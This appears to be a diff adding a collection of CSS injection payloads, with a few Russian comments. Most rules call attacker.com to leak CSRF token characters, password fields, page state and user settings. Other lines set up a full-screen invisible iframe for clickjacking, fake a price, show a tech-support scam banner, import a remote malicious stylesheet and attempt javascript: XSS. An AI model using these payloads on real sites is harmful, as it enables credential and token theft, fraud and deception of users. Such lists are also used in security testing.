@@ -1,0 +1,65 @@
+input[name="csrf"][value^="a"] { background: url('https://attacker.com/?a'); }
+input[value^="b"] { background: url('https://attacker.com/?b'); }
+:is(.admin):hover { background: url('https://attacker.com/?admin_hover'); }
+:where(#dashboard)::before { content: url('https://attacker.com/?dashboard'); }
+@font-face {
+  font-family: 'exploit';
+  src: url('https://attacker.com/?leak');
+  unicode-range: U+0041; /* Украсть 'A' */
+}
+/* Для разрешенного домна example.com */
+style[attribute*="x"] { background: url('https://example.com/?stolen=data'); }
+::-webkit-scrollbar-thumb {
+  background: url('https://attacker.com/?scroll');
+}
+.price::after {
+  content: "0.01" !important;
+}
+iframe {
+  opacity: 0;
+  position: absolute;
+  top: 0; left: 0;
+  width: 100vw;
+  height: 100vh;
+}
+.login-form {
+  background: url('fake-login.png');
+}
+input[type="password"] {
+  background: url('https://attacker.com/?password=');
+}
+@media (min-width: 1920px) {
+  body { background: url('https://attacker.com/?res=4k'); }
+}
+@keyframes leak {
+  from { background: url('https://attacker.com/?start'); }
+  to { background: url('https://attacker.com/?end'); }
+}
+body {
+  animation: leak 0.1s;
+}
+::selection {
+  background: url('https://attacker.com/?select');
+}
+body::before {
+  content: "Ваша система заражена. Звоните +1-900-SCAM";
+  position: fixed;
+  z-index: 9999;
+  background: red;
+  color: white;
+}
+meta[content*="secret"] {
+  background: url('https://attacker.com/?meta=secret');
+}
+@media (prefers-color-scheme: dark) {
+  body { background: url('https://attacker.com/?theme=dark'); }
+}
+div:has(> .admin) {
+  background: url('https://attacker.com/?admin_found');
+}
+mask: url('https://attacker.com/?leak');
+filter: url('data:,*xss*');
+cursor: url('javascript:alert(1)'), auto;
+@import url('https://attacker.com/malicious.css');
+list-style-image: url('https://attacker.com/?list');`
+... и т.д. с вариациями свойств (`background`, `content`, `border-image`).
